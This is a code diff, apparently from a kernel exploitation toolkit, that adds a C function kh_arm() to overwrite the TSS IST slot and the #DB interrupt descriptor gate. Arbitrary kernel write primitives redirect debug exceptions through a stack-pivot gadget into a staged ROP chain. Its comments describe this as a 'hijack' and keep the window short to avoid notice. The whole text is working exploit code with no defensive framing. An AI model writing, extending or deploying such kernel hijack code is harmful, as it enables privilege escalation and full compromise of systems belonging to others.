@@ -493,6 +493,39 @@ resumed:
   return;
 }
 
+/* Arm the hook on its own: write only the TSS IST slot and the #DB IDT gate.
+ * Everything else (scratch page, chains, big blob) is staged by kh_install(),
+ * which can run with KH_SKIP_IST|KH_SKIP_GATE so the hijack is not live until
+ * this call. Used to keep the hijack window to the sleep itself. */
+int kh_arm(khook_t *kh)
+{
+  uint64_t db_gate, ist, lo, hi, arm_chain;
+
+  if (!kh || !kh->idt_base || !kh->tss_base || !kh->kcs)
+    return -1;
+
+  db_gate   = kh->idt_base + 16 * KH_VEC_DB;
+  ist       = ist_slot_va(kh);
+  arm_chain = kh->scratch_base + KH_OFF_CHAIN_ARM;
+
+  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kh->kcs, kh->ist_index,
+              KH_GATE_INTERRUPT, 0, 1, &lo, &hi);
+
+  if (kwrite_q(kh, ist, arm_chain) != 0)
+    return -2;
+  if (kwrite_q(kh, db_gate + 8, hi) != 0)
+    return -3;
+  if (kwrite_q(kh, db_gate, lo) != 0)
+    return -4;
+
+  if (kread_q(kh, ist) != arm_chain)
+    return -5;
+  if (kread_q(kh, db_gate) != lo || kread_q(kh, db_gate + 8) != hi)
+    return -6;
+
+  return 0;
+}
+
 int kh_disarm(khook_t *kh)
 {
   uint8_t buf[0x60];
